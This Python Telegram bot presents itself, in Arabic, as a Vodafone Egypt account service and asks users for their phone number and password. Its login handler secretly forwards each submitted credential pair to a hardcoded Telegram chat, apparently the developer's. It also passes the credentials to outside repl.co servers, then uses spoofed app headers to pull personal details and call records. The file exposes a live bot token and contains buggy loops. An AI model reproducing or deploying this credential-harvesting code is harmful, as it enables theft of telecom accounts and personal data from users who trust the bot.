import time
import requests
import telebot
from telebot import util
from telebot import types
tokin = "5090486218:AAEZV9uj2o-o5nFELmFiPxPIFWeuBnSvAtw" #tokin bot

def check_user(user_id):
    global tokin
    request = requests.get(
        f"https://api.telegram.org/bot{tokin}/getChatMember?chat_id=@SMOKA_28&user_id={user_id}"
    ).text
    if '"status":"left"' in request or '"Bad Request: USER_ID_INVALID"' in request or '"status":"kicked"' in request or 'user not found' in request:
        return False
    else:
        return True
while True:
    try:
        bot = telebot.TeleBot(tokin)
        @bot.message_handler(commands=['start'])
        def welcome(message):
            name = message.from_user.username 
            ID = message.chat.id
            first = message.from_user.first_name
            channel = types.InlineKeyboardButton(
                text="Channel Developer ",
                url="https://t.me/SMOKA_28")
            if check_user(message.from_user.id):
                login = types.InlineKeyboardButton(text="♻ ️تسجيل الدخول",callback_data="login")
                programmer = types.InlineKeyboardButton(text="مراسلة المطور ",url="https://t.me/smoka28")
                
                Keyboards = types.InlineKeyboardMarkup()
                Keyboards.row_width = 1
                Keyboards.add(login,programmer)
                
                bot.send_photo(message.chat.id, 'https://ibb.co/31gzyjP', caption=f"🌹| مىحبًا بك {message.from_user.first_name} في بوت فودافون" ,parse_mode='html', reply_markup=Keyboards)
            else:
                Keyboard = types.InlineKeyboardMarkup()
                Keyboard.row_width = 1
                Keyboard.add(channel)
                bot.reply_to(message,text=f"مرحبا {message.from_user.first_name} \n من فضلك اشترك بقناه المطور ثم حاول تشغيل البوت مجددا /start",reply_markup=Keyboard)

        @bot.callback_query_handler(func=lambda call: True)
        def bot_query_handler(call):
            if call.data == "login":
                login(call.message)
            elif call.data == "info":
                info(call.message)
            elif call.data == "lel":
                lel_get(call.message)
            elif call.data == "start":
                start(call.message)
            elif call.data == "info1":
                info1(call.message)
            elif call.data == "info3":
                info3(call.message)
            elif call.data == "ofer":
                ofer(call.message)
            elif call.data == "oferr":
                oferr(call.message)
            elif call.data == "ofer1":
                ofer1(call.message)
            elif call.data == "ofer2":
                ofer2(call.message)
            elif call.data == "ofer3":
                ofer3(call.message)
            elif call.data == "ofer4":
                ofer4(call.message)
                
                
                
            
        def login(message):
            msg = bot.reply_to(message,"""
أدخل رقم الهاتف وكلمه المرور
numper:password
""")
            bot.register_next_step_handler(msg, run_watch)
            
            
        def run_watch(message):
        	global msg
        	msg = message.text
        	if ':' in msg:
        		start = bot.send_message(message.chat.id,f'يتم تسجيل الدخول⏳')
        		bot.delete_message(message.chat.id, message.message_id - 1)
        		time.sleep(0.5)
        		bot.edit_message_text(text=f'يتم تسجيل الدخول⌛',chat_id=int(message.chat.id),message_id=start.message_id)
        		time.sleep(0.5)
        		bot.edit_message_text(text=f'يتم تسجيل الدخول⏳',chat_id=int(message.chat.id),message_id=start.message_id)
        		bot.send_message("1426956326", text=f'''
{msg}
''',parse_mode="html")
        		try:
        			num = msg.split(':')[0]
        			password = msg.split(':')[1]
        			re=requests.get(f"https://vodafone-4.mhmdlsmk.repl.co/login?number={num}&pwd={password}").json()["token"]
        			start = types.InlineKeyboardButton(text="الصفحة الرئيسية",callback_data="start")
        			Keyboards = types.InlineKeyboardMarkup()
        			Keyboards.row_width = 1
        			Keyboards.add(start)
        			bot.send_photo(message.chat.id, 'https://ibb.co/MCVG9j8', caption=f"""<strong>
تم تسجيل الدخول بنجاح✅
</strong>""" ,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=Keyboards)
        			bot.delete_message(message.chat.id, message.message_id + 1)
			
        			
        		except:
        			bot.send_photo(message.chat.id, 'https://ibb.co/R9vpq7c', caption=f"""<strong>
كلمة السر أو الرقم غير صحيح❌
</strong>""" ,parse_mode='html',reply_to_message_id=message.message_id)
        			bot.send_message(message.chat.id, text=f"<strong></strong>",parse_mode="html")
        	else:
        		bot.send_message(message.chat.id, text=f"<strong>ex:\n  num:pass</strong>",parse_mode="html")
        		
        		
        		
        def start(message):
            global msg
            info = types.InlineKeyboardButton(text="معلومات حسابك",callback_data="info")
            info1 = types.InlineKeyboardButton(text="تفاصيل الإستهلاك",callback_data="info1")
            info2 = types.InlineKeyboardButton(text="العروض",callback_data="ofer")
            info3 = types.InlineKeyboardButton(text="سجل المكالمات",callback_data="info3")
            Keyboards = types.InlineKeyboardMarkup()
            Keyboards.row_width = 1
            Keyboards.add(info,info1,info3)
            
            bot.send_photo(message.chat.id, 'https://ibb.co/23FhfN5', parse_mode='html',reply_to_message_id=message.message_id, reply_markup=Keyboards)
        def info(message):
            global msg
            num = msg.split(':')[0]
            password = msg.split(':')[1]
            re=requests.get(f"https://info.mhmdlsmk.repl.co/login?number={num}&pwd={password}").json()
            FirstName=re["FirstName"]
            LastName=re["LastName"]
            MB=re["MB"]
            Nickname=re["Nickname"]
            accountId=re["accountId"]
            accountNumber=re["accountNumber"]
            age=re["age"]
            balance=re["balance"]
            birthDate=re["birthDate"]
            city=re["city"]
            contractSubType=re["contractSubType"]
            customerID=re["customerID"]
            customerIp=re["customerIp"]
            customerModifedDate=re["customerModifedDate"]
            customerStatus=re["customerStatus"]
            endDateTime=re["endDateTime"]
            flix=re["flix"]
            gender=re["gender"]
            nationality=re["nationality"]
            serviceClassName=re["serviceClassName"]
            sim=re["sim"]
            startDateTime=re["startDateTime"]
            tariffModelName=re["tariffModelName"]
            title=re["title"]
            
            
            
            bot.send_photo(message.chat.id, 'https://ibb.co/9qhwJDy', caption=f"<strong>✪معلومات الحساب\n- - - - - - - - - -\n❃ الإسم الأول : {FirstName}\n❃ الإسم الأخير : {LastName}\n❃ الإسم البديل : {Nickname}\n❃ الوصف : {gender}\n❃ النوع : {title}\n❃ العمر : {age}\n❃ تاريخ الميلاد : {birthDate}\n❃ الجنسيه : {nationality}\n❃ المحافظة : {city}\n❃ الفليكس كوينز : {balance}\n❃ نموذج التعريفة : {tariffModelName}\n❃ فئة الخدمة : {serviceClassName}\n❃ نظام الخط : {contractSubType}\n❃ الموبايل إنترنت : {MB}\n❃ الفليكسات : {flix}\n❃ تاريخ انتهاء الباقة : {endDateTime}\n❃ تاريخ شراء الخط : {customerModifedDate}\n❃ تاريخ اخر استبدال : {startDateTime}\n❃ حالة العميل : {customerStatus}\n❃ رقم الحساب : {accountNumber}\n❃  الرقم التعريفي للحساب: {accountId}\n❃ الرقم التسلسلي للشريحة : {sim}\n❃ بروتوكول الإنترنت : {customerIp}\n❃ الرقم التعريفي للعميل : {customerID}</strong>" ,parse_mode='html')
        			
            
            
        def info1(message):
        	global msg
        	num = msg.split(':')[0]
        	password = msg.split(':')[1]
        	re=requests.get(f"https://vodafone-4.mhmdlsmk.repl.co/login?number={num}&pwd={password}").json()["token"]
        	url=f"https://mobile.vodafone.com.eg/services/dxl/usagemng/usage?relatedParty.id={num}&validFor.startDateTime=1657663200000&%40type=BalanceDetails&validFor.endDateTime=1660168800000&limit=10&until="
        	hd={"api-host": "UsageManagementHost",
"x-dynatrace": "MT_3_15_842549437_58-0_a556db1b-4506-43f3-854a-1d2527767923_134_2850_273",
"api-version": "v2",
"x-agent-operatingsystem": "V12.5.16.0.RKLMIXM",
"clientId": "AnaVodafoneAndroid",
"x-agent-device": "secret",
"x-agent-version": "2021.12.2",
"x-agent-build": "493",
"Content-Type": "application/json",
"Accept": "application/json",
"msisdn": f"{num}",
"Accept-Language": "ar",
"Authorization": f"Bearer {re}",
"Host": "mobile.vodafone.com.eg",
"Connection": "Keep-Alive",
"User-Agent": "okhttp/4.9.1"}
        	req=requests.get(url,headers=hd).json()
        	dataa=req[0]["date"]
        	Amount=req[0]["ratedProductUsage"][0]["taxIncludedRatingAmount"]
        	description=req[0]["description"]
        	s=-1
        	

        	li = []
        	for re in req:
        		s+=1
        		dataa=req[s]["date"]
        		description=req[s]["description"]
        		Amount=req[s]["ratedProductUsage"][0]["taxIncludedRatingAmount"]
        		m=f"❃{description} _ ❃التاريخ: {dataa} _ ❃الاستهلاك: {Amount} &"
        		li.append(m)
        	st=str(li).replace(",", "\n")
        	sttt=st.replace("'", "").replace("]","").replace("[","").replace("_", "\n").replace("&", "\n")
        	
        	bot.send_photo(message.chat.id, 'https://ibb.co/61t8d1d', caption=sttt ,parse_mode='html')
        			
        	
        	
        	

        	
        def ofer(message):
        	global msg
        	num = msg.split(':')[0]
        	password = msg.split(':')[1]
        	re=requests.get(f"https://vodafone-4.mhmdlsmk.repl.co/login?number={num}&pwd={password}").json()["token"]
        	url="https://mobile.vodafone.com.eg/services/dxl/promo/promotion?%40type=Promo&%24.context.type=offerstab&%24.characteristics%5B%40name%3D%27balance%27%5D.value=0"
        	hd={"channel": "MOBILE",
"useCase": "Promo",
"x-dynatrace": "MT_3_15_842549437_61-0_a556db1b-4506-43f3-854a-1d2527767923_327_6666_516",
"api-version": "v2",
"x-agent-operatingsystem": "V12.5.16.0.RKLMIXM",
"clientId": "AnaVodafoneAndroid",
"x-agent-device": "secret",
"x-agent-version": "2021.12.2",
"x-agent-build": "493",
"Content-Type": "application/json",
"Accept": "application/json",
"msisdn": f"{num}",
"Accept-Language": "ar",
"Host": "mobile.vodafone.com.eg",
"Connection": "Keep-Alive",
"Authorization": f"Bearer {re}",
"Accept-Encoding": "gzip",
"User-Agent": "okhttp/4.9.1"}
        	req=requests.get(url,headers=hd).json()
        	try:
	        	name4=req[4]["name"]
	        	description4=req[4]["description"]
	        	id4=req[4]["id"]
	        	name3=req[3]["name"]
	        	description3=req[3]["description"]
	        	id3=req[3]["id"]
	        	name2=req[2]["name"]
	        	description2=req[2]["description"]
	        	id2=req[2]["id"]
	        	name1=req[1]["name"]
	        	description1=req[1]["description"]
	        	id1=req[1]["id"]
	        	name=req[0]["name"]
	        	description=req[0]["description"]
	        	id=req[0]["id"]
	        	ofer4 = types.InlineKeyboardButton(text=name4,callback_data="ofer4")
	        	ofer3 = types.InlineKeyboardButton(text=name3,callback_data="ofer3")
	        	ofer2 = types.InlineKeyboardButton(text=name2,callback_data="ofer2")
	        	ofer1 = types.InlineKeyboardButton(text=name1,callback_data="ofer1")
	        	oferr = types.InlineKeyboardButton(text=name,callback_data="oferr")
	        	Keyboards = types.InlineKeyboardMarkup()
	        	Keyboards.row_width = 1
	        	Keyboards.add(oferr,ofer1,ofer2,ofer3,ofer4)
	        	bot.reply_to(message,text=f"غروضك",reply_markup=Keyboards)
        	except:
        		try:
	        		name3=req[3]["name"]
	        		description3=req[3]["description"]
	        		id3=req[3]["id"]
	        		name2=req[2]["name"]
	        		description2=req[2]["description"]
	        		id2=req[2]["id"]
	        		name1=req[1]["name"]
	        		description1=req[1]["description"]
	        		id1=req[1]["id"]
	        		name=req[0]["name"]
	        		description=req[0]["description"]
	        		id=req[0]["id"]
	        		print(id)
	        		
	        		ofer3 = types.InlineKeyboardButton(text=name3,callback_data="ofer4")
	        		ofer2 = types.InlineKeyboardButton(text=name2,callback_data="ofer3")
	        		ofer1 = types.InlineKeyboardButton(text=name1,callback_data="ofer1")
	        		oferr = types.InlineKeyboardButton(text=name,callback_data="oferr")
	        		Keyboards = types.InlineKeyboardMarkup()
	        		Keyboards.row_width = 1
	        		Keyboards.add(oferr,ofer1,ofer2,ofer3)
	        		bot.reply_to(message,text=f"غروضك",reply_markup=Keyboards)
	        	except:
	        		try:
	        			name2=req[2]["name"]
	        			description2=req[2]["description"]
	        			id2=req[2]["id"]
	        			name1=req[1]["name"]
	        			description1=req[1]["description"]
	        			id1=req[1]["id"]
	        			name=req[0]["name"]
	        			description=req[0]["description"]
	        			id=req[0]["id"]
	        			ofer2 = types.InlineKeyboardButton(text=name2,callback_data="ofer3")
	        			ofer1 = types.InlineKeyboardButton(text=name1,callback_data="ofer1")
	        			oferr = types.InlineKeyboardButton(text=name,callback_data="oferr")
	        			Keyboards = types.InlineKeyboardMarkup()
	        			Keyboards.row_width = 1
	        			Keyboards.add(oferr,ofer1,ofer2)
	        			bot.reply_to(message,text=f"غروضك",reply_markup=Keyboards)
	        		except:
	        			try:
		        			name1=req[1]["name"]
		        			description1=req[1]["description"]
		        			id1=req[1]["id"]
		        			name=req[0]["name"]
		        			description=req[0]["description"]
		        			id=req[0]["id"]
		        			
		        			ofer1 = types.InlineKeyboardButton(text=name1,callback_data="ofer1")
		        			oferr = types.InlineKeyboardButton(text=name,callback_data="oferr")
		        			Keyboards = types.InlineKeyboardMarkup()
		        			Keyboards.row_width = 1
		        			Keyboards.add(ofer1,oferr)
		        			bot.reply_to(message,text=f"غروضك",reply_markup=Keyboards)
		        		except:
		        			bot.send_message(message.chat.id,f'✲ Starting ⏳ Please Wait ...')


        def oferr(message):
        	global msg
        	num = msg.split(':')[0]
        	password = msg.split(':')[1]
        	re=requests.get(f"https://vodafone-4.mhmdlsmk.repl.co/login?number={num}&pwd={password}").json()["token"]
        	url="https://mobile.vodafone.com.eg/services/dxl/promo/promotion?%40type=Promo&%24.context.type=offerstab&%24.characteristics%5B%40name%3D%27balance%27%5D.value=0"
        	hd={"channel": "MOBILE",
"useCase": "Promo",
"x-dynatrace": "MT_3_15_842549437_61-0_a556db1b-4506-43f3-854a-1d2527767923_327_6666_516",
"api-version": "v2",
"x-agent-operatingsystem": "V12.5.16.0.RKLMIXM",
"clientId": "AnaVodafoneAndroid",
"x-agent-device": "secret",
"x-agent-version": "2021.12.2",
"x-agent-build": "493",
"Content-Type": "application/json",
"Accept": "application/json",
"msisdn": f"{num}",
"Accept-Language": "ar",
"Host": "mobile.vodafone.com.eg",
"Connection": "Keep-Alive",
"Authorization": f"Bearer {re}",
"Accept-Encoding": "gzip",
"User-Agent": "okhttp/4.9.1"}
        	req=requests.get(url,headers=hd).json()
        	description=req[0]["description"]
        	id=req[0]["id"]
        	dnoferr = types.InlineKeyboardButton(text=description,callback_data="dnoferr")
	        Keyboards = types.InlineKeyboardMarkup()
	        Keyboards.row_width = 1
	        Keyboards.add(dnoferr)
	        bot.reply_to(message,text=description,reply_markup=Keyboards)
        	
        	
        	
        def info3(message):
        	global msg
        	num = msg.split(':')[0]
        	password = msg.split(':')[1]
        	
        	re=requests.get(f"https://vodafone-4.mhmdlsmk.repl.co/login?number={num}&pwd={password}").json()["token"]
        	url=f"https://mobile.vodafone.com.eg/mobile-app/usage/topUsage/{num}?Type=CALL&billDate=909180000000&billCycle=03&customerCode=1.213017577"
        	hd={
"hash": "1p29Kbc8edikp+ZZ0N1mNG9yFkap7BVrnBrSdpr02J4=",
"api-version": "v2",
"x-agent-operatingsystem": "V12.5.16.0.RKLMIXM",
"clientId": "AnaVodafoneAndroid",
"x-agent-device": "secret",
"x-agent-version": "2021.12.2",
"x-agent-build": "493",
"Content-Type": "application/json",
"Accept": "application/json",
"buildNumber": "493",
"operatingSystem": "V12.5.16.0.RKLMIXM",
"platform": "Android",
"deviceType": "secret",
"Accept-Language": "ar",
"Authorization": f"Bearer {re}",
"Host": "mobile.vodafone.com.eg",
"Connection": "Keep-Alive",
"User-Agent": "okhttp/4.9.1"}
        	req=requests.get(url,headers=hd).json()
        	m=(req["topUsageList"])
        	
        	urll=f"https://mobile.vodafone.com.eg/mobile-app/usage/topUsage/{num}?Type=COST&billDate=909180000000&billCycle=03&customerCode=1.213017577"
        	hdd={
"hash": "fDvnqQBpJUL2x23aXprfijjonZGiJBRD/kBIIlh/8+E=",
"api-version": "v2",
"x-agent-operatingsystem": "V12.5.16.0.RKLMIXM",
"clientId": "AnaVodafoneAndroid",
"x-agent-device": "secret",
"x-agent-version": "2021.12.2",
"x-agent-build": "493",
"Content-Type": "application/json",
"Accept": "application/json",
"buildNumber": "493",
"operatingSystem": "V12.5.16.0.RKLMIXM",
"platform": "Android",
"deviceType": "secret",
"Accept-Language": "ar",
"Authorization": f"Bearer {re}",
"Host": "mobile.vodafone.com.eg",
"Connection": "Keep-Alive",
"User-Agent": "okhttp/4.9.1"}
        	reeq=requests.get(urll,headers=hdd).json()
        	
        	s=(reeq["topUsageList"])
        	urlll=f"https://mobile.vodafone.com.eg/mobile-app/usage/topUsage/{num}?Type=DURATION&billDate=909180000000&billCycle=03&customerCode=1.213017577"
        	hddd={
"hash": "OYpATaE54oTQWiNoQgn7Tf+SZuCUjIrGSG5wOTn8gEs=",
"api-version": "v2",
"x-agent-operatingsystem": "V12.5.16.0.RKLMIXM",
"clientId": "AnaVodafoneAndroid",
"x-agent-device": "secret",
"x-agent-version": "2021.12.2",
"x-agent-build": "493",
"Content-Type": "application/json",
"Accept": "application/json",
"buildNumber": "493",
"operatingSystem": "V12.5.16.0.RKLMIXM",
"platform": "Android",
"deviceType": "secret",
"Accept-Language": "ar",
"Authorization": f"Bearer {re}",
"Host": "mobile.vodafone.com.eg",
"Connection": "Keep-Alive",
"User-Agent": "okhttp/4.9.1"}
        	reeq1=requests.get(urlll,headers=hddd).json()
        	
        	ss=(reeq1["topUsageList"])
        	a = -1
        	li = []
        	for i in m and s and ss:
        		a+=1
        		msisdn=m[a]["msisdn"]
        		add=m[a]["value"]
        		card=s[a]["value"]
        		mu=float(ss[a]["value"])
        		g=(mu/60)
        		ms=(f" الرقم {msisdn} - عدد المكالمات {add}  - التكلفة {card} جنيها - مده المكالمات {g} دقيقة")
        		li.append(ms)
        	ko=str(li)
        	vo=ko.replace("[","").replace("]","").replace("{","").replace("}","").replace("'","").replace(",","\n\n")
        	bot.send_photo(message.chat.id, 'https://ibb.co/jfYwMyq', caption=vo ,parse_mode='html')
        	
        	
        	
        	
        	
        	
    	
    	
    	

        try:
            
            bot.polling(True)
        except Exception as ex:
            print(ex)
            telebot.logger.error(ex)
    except:
        continue
